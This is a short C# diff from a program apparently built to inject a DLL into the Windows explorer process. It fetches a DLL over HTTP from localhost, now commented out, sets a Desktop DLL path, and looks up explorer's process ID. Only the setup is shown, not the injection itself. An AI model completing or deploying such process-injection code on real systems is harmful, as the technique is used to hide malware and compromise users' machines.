@@ -140,12 +140,12 @@ namespace cevsn
             //Todo: Get dll from Webserver
             //create httpclient to download cevsn.dll from http server
             HttpClient client = new HttpClient();
-            client.GetByteArrayAsync("http://localhost:8080/cevsn.dll");
-            byte[] dll = client.GetByteArrayAsync("http://localhost:8080/cevsn.dll").Result;
+            //client.GetByteArrayAsync("http://localhost:8080/cevsn.dll");
+            //byte[] dll = client.GetByteArrayAsync("http://localhost:8080/cevsn.dll").Result;
 
 
             String dir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            String dllName = dir + "\\devsn.dll";
+            String dllName = dir + "\\Devsn.dll";
 
             Process[] expProc = Process.GetProcessesByName("explorer");
             uint pid = Convert.ToUInt32(expProc[0].Id);
